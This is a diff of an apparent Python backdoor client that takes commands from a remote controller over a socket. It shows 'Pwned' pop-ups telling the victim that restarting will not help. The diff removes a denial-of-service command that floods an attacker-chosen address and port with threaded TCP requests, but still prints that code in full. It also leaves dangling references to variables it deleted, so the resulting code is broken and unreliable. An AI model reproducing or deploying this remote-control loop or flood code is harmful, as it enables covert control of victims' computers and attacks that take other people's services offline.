@@ -126,11 +126,7 @@ while True:
 
 
         if encodeddata == "Noti":
-            notification.notify(title="HEHE Pwned", message="It doesnt help to restart the Computer or anything xD", timeout=10)
-            notification.notify(title="HEHE Pwned", message="It doesnt help to restart the Computer or anything xD", timeout=10)
-            notification.notify(title="HEHE Pwned", message="It doesnt help to restart the Computer or anything xD", timeout=10)
-            notification.notify(title="HEHE Pwned", message="It doesnt help to restart the Computer or anything xD", timeout=10)
-            notification.notify(title="HEHE Pwned", message="It doesnt help to restart the Computer or anything xD", timeout=10)
+            notification.notify(title="Pwned", message="It doesnt help to restart the Computer", timeout=10)
             time.sleep(2)
             s.send(bytes("Worked", "utf-8"))
             continue
@@ -185,44 +181,9 @@ while True:
             sys.exit()
             continue
 
-
-        if encodeddata == "Ddos":
-            s.send(bytes("What adress?" + "\n" + "example 192.168...", "utf-8"))
-            decodedddosadress = s.recv(256)
-            encodedadress = decodedddosadress.decode("utf-8")
-            s.send(bytes("What Port? ", "utf-8"))
-            decodedProtforddos = s.recv(256)
-            encodedPortforddos = decodedProtforddos.decode("utf-8")
-
-
-
             host = encodedadress
             ip = host
             port = encodedPortforddos
-
-            def dos():
-                while True:
-                    mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                    try:
-                        mysocket.connect((ip, port))
-                        mysocket.send(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"))
-                        mysocket.sendto(str.encode("GET " + "haste mal 3 fufzig" + "HTTP/1.1 \r\n"), (ip, port))
-                    except socket.error:
-                        s.send(bytes("ERROR!", "utf-8"))
-                    mysocket.close()
-
-            for i in range(8):
-                t = Thread(target=dos)
-                t.start()
-
-            s.send(bytes("COMPLETED", "utf-8"))
-
-
-
-
-
-
-
 
         else:
             s.send(bytes("Nope not a valid Command", "utf-8"))
